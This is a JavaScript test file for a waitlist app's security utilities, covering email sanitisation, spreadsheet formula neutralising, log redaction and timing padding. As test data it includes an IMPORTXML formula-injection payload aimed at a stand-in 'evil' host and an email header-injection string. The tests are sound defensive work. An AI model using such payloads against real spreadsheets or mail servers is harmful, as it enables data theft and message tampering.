/* =========================================================
   NOOKAA — Tests
   test/security.test.js

   Covers the modules that carry the security guarantees and that
   need no network or Google credentials to exercise:
     utils/email.js      validation, sanitisation, formula neutralising
     utils/logger.js     redaction of addresses, keys and sheet ids
     utils/httpError.js  timing equalisation

   Run with:  npm test
   ========================================================= */

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

const {
  sanitizeText,
  neutralizeFormula,
  normalizeEmail,
  checkStructure,
  MAX_EMAIL_LENGTH,
} = require('../server/utils/email');

const { fingerprint, maskEmail, scrubSecrets } = require('../server/utils/logger');
const { padDuration, HttpError } = require('../server/utils/httpError');

/* ---------------------------------------------------------
   Email validation
   --------------------------------------------------------- */

test('accepts well-formed addresses', () => {
  const good = [
    'a@b.co',
    'user.name+tag@sub.example.co.uk',
    'x_y-z@mail-server.io',
    '123@numbers.com',
    "o'brien@example.com",
  ];
  for (const email of good) {
    assert.equal(checkStructure(normalizeEmail(email)).ok, true, email);
  }
});

test('rejects malformed addresses', () => {
  const bad = [
    '',
    '   ',
    'plain',
    'a@b',
    '@b.com',
    'a@.com',
    'a@b..com',
    'a b@c.com',
    'a@b.c',
    'a@-bad.com',
    'a@bad-.com',
    '.a@b.com',
    'a.@b.com',
    'a..b@c.com',
    'a@b.c0m',
    'a@[10.0.0.1]',
    `${'a'.repeat(65)}@b.com`,
    `a@${'x'.repeat(64)}.com`,
    `${'a'.repeat(250)}@example.com`,
  ];
  for (const email of bad) {
    assert.equal(checkStructure(normalizeEmail(email)).ok, false, JSON.stringify(email));
  }
});

test('rejects addresses longer than the RFC limit', () => {
  const long = `${'a'.repeat(60)}@${'b'.repeat(60)}.${'c'.repeat(60)}.${'d'.repeat(60)}.${'e'.repeat(60)}.com`;
  assert.ok(long.length > MAX_EMAIL_LENGTH);
  assert.equal(checkStructure(normalizeEmail(long)).ok, false);
});

/* ---------------------------------------------------------
   Sanitisation
   --------------------------------------------------------- */

test('normalises case and surrounding whitespace', () => {
  assert.equal(normalizeEmail('  USER@Example.COM  '), 'user@example.com');
});

test('strips invisible and bidirectional characters', () => {
  assert.equal(normalizeEmail('us\u200Ber@ex.com'), 'user@ex.com');
  assert.equal(normalizeEmail('a\u202Eb@ex.com'), 'ab@ex.com');
  assert.equal(normalizeEmail('a\uFEFFb@ex.com'), 'ab@ex.com');
});

test('strips control characters, defeating header and log injection', () => {
  assert.equal(normalizeEmail('a@ex.com\r\nBcc: x@y.com'), 'a@ex.combcc: x@y.com');
  assert.equal(checkStructure(normalizeEmail('a@ex.com\nX-Injected: 1')).ok, false);
  assert.ok(!sanitizeText('line1\nline2').includes('\n'));
});

test('handles non-string input without throwing', () => {
  for (const value of [null, undefined, 42, {}, [], true]) {
    assert.equal(normalizeEmail(value), '');
    assert.equal(sanitizeText(value), '');
  }
});

test('truncates oversized free text', () => {
  assert.equal(sanitizeText('x'.repeat(500), 80).length, 80);
});

/* ---------------------------------------------------------
   Spreadsheet formula injection
   --------------------------------------------------------- */

test('neutralises every spreadsheet formula prefix', () => {
  assert.equal(neutralizeFormula('=IMPORTXML("http://evil","//x")'), "'=IMPORTXML(\"http://evil\",\"//x\")");
  assert.equal(neutralizeFormula('+1+1'), "'+1+1");
  assert.equal(neutralizeFormula('-2'), "'-2");
  assert.equal(neutralizeFormula('@SUM(A1:A9)'), "'@SUM(A1:A9)");
  assert.equal(neutralizeFormula('\tx'), "'\tx");
  assert.equal(neutralizeFormula('\rx'), "'\rx");
});

test('leaves ordinary values untouched', () => {
  assert.equal(neutralizeFormula('website'), 'website');
  assert.equal(neutralizeFormula('user@example.com'), 'user@example.com');
  assert.equal(neutralizeFormula('2026-07-23T10:00:00.000Z'), '2026-07-23T10:00:00.000Z');
  assert.equal(neutralizeFormula(''), '');
  assert.equal(neutralizeFormula(undefined), '');
});

/* ---------------------------------------------------------
   Log redaction
   --------------------------------------------------------- */

test('log fingerprints are stable within a process and non-reversible', () => {
  const a = fingerprint('203.0.113.7');
  assert.equal(a, fingerprint('203.0.113.7'));
  assert.notEqual(a, fingerprint('203.0.113.8'));
  assert.equal(a.length, 8);
  assert.ok(!a.includes('203'));
  assert.equal(fingerprint(''), '-');
});

test('masked emails keep the domain and drop the local part', () => {
  const masked = maskEmail('secret.person@gmail.com');
  assert.ok(masked.endsWith('@gmail.com'));
  assert.ok(!masked.includes('secret'));
  assert.ok(!masked.includes('person'));
  assert.equal(maskEmail('not-an-email'), '-');
  assert.equal(maskEmail(null), '-');
});

test('scrubs sheet ids, private keys and service account addresses', () => {
  const sheetId = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';
  const scrubbed = scrubSecrets(`GET https://sheets.googleapis.com/v4/spreadsheets/d/${sheetId}/values`);
  assert.ok(!scrubbed.includes(sheetId));
  assert.ok(scrubbed.includes('[redacted]'));

  const withKey = scrubSecrets('-----BEGIN PRIVATE KEY-----\nMIIEvQIBADAN\n-----END PRIVATE KEY-----');
  assert.ok(!withKey.includes('MIIEvQIBADAN'));

  const withSa = scrubSecrets('auth failed for waitlist-api-1234567890abcdefghij@proj.iam.gserviceaccount.com');
  assert.ok(!withSa.includes('waitlist-api-1234567890abcdefghij'));

  assert.equal(scrubSecrets(null), '');
});

/* ---------------------------------------------------------
   Timing equalisation
   --------------------------------------------------------- */

test('padDuration holds a fast path open to the floor', async () => {
  const started = Date.now();
  await padDuration(started, 120);
  assert.ok(Date.now() - started >= 115, 'should wait for the floor');
});

test('padDuration does not delay an already-slow path', async () => {
  const started = Date.now() - 500; // already well past the floor
  const before = Date.now();
  await padDuration(started, 120);
  // Must resolve without arming a timer at all. The bound is generous
  // relative to the 120ms floor so the test cannot flake on a loaded
  // machine while still failing loudly if a timer is scheduled.
  assert.ok(Date.now() - before < 100, 'should return without waiting');
});

/* ---------------------------------------------------------
   Error shape
   --------------------------------------------------------- */

test('HttpError carries a public message and hides its cause', () => {
  const cause = new Error('spreadsheet 1AbC not found for sa@x.iam.gserviceaccount.com');
  const err = new HttpError(503, 'Please try again in a moment.', { code: 'store_missing', cause });

  assert.equal(err.status, 503);
  assert.equal(err.code, 'store_missing');
  assert.equal(err.message, 'Please try again in a moment.');
  assert.ok(!err.message.includes('spreadsheet'));
  assert.equal(err.cause, cause);
});

/* ---------------------------------------------------------
   Duplicate fingerprinting
   --------------------------------------------------------- */

test('the duplicate index uses a keyed, non-reversible fingerprint', () => {
  function loadWithSecret(secret) {
    process.env.EMAIL_HASH_SECRET = secret;
    delete require.cache[require.resolve('../server/utils/config')];
    delete require.cache[require.resolve('../server/utils/emailHash')];
    return require('../server/utils/emailHash').hashEmail;
  }

  const withKeyA = loadWithSecret('a'.repeat(48));
  const hashed = withKeyA('person@example.com');

  assert.equal(hashed, withKeyA('person@example.com'), 'stable for the same input');
  assert.notEqual(hashed, withKeyA('other@example.com'), 'differs across inputs');
  assert.ok(!hashed.includes('person'), 'does not contain the local part');
  assert.ok(!hashed.includes('example'), 'does not contain the domain');

  // A different pepper must yield a different digest, otherwise a leaked
  // index would be crackable with a wordlist of common addresses.
  const withKeyB = loadWithSecret('b'.repeat(48));
  assert.notEqual(hashed, withKeyB('person@example.com'), 'keyed by EMAIL_HASH_SECRET');

  delete process.env.EMAIL_HASH_SECRET;
});
